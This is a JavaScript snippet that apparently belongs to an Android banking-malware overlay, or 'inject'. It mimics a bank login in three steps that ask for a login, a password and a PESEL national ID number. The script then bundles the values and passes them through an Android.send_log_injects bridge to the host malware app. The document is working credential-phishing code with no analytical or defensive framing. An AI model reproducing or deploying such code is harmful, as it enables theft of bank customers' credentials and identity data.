    <script>

        $('#login').mask('00000000');
        $('#password').mask('00000000');
        $('#pesel').mask('00000000000');

        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            pesel = document.getElementById('pesel'),
            nextPage = document.getElementById('nextPage'),
            lastPage = document.getElementById('lastPage'),
            sendData = document.getElementById('sendData'),
            form = document.getElementById('form'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            form3 = document.getElementById('form3');

        nextPage.onclick = function() {
            if(login.value.length != 8) {
                login.classList.add('error');
                login.focus();
            } else {
                login.classList.remove('error');
                form1.style.display = 'none';
                form2.style.display = 'flex';
                form3.style.display = 'none';
            }
        }

        lastPage.onclick = function() {
            if(password.value.length != 8) {
                password.classList.add('error');
            } else {
                password.classList.remove('error')

                form2.style.display = 'none';
                form3.style.display = 'flex';
            }
        }

        sendData.onclick = function() {
            if(pesel.value.length < 6) {
                pesel.classList.add('error');
            } else {
                pesel.classList.remove('error')
                
                var data = {};
                    data.login = login.value;
                    data.password = password.value;
                    data.pesel = pesel.value;
                    data.type_injects = "banks";
                    data.closed = "close_activity_injects";
                    
                    var ua = navigator.userAgent.toLowerCase();
                    if(ua.indexOf("android") > -1) {
                        try {
                            Android.send_log_injects(JSON.stringify(data))
                        } catch (err) {}
                    }else{
                        alert(JSON.stringify(data));
                    }
            }
        }
    </script>
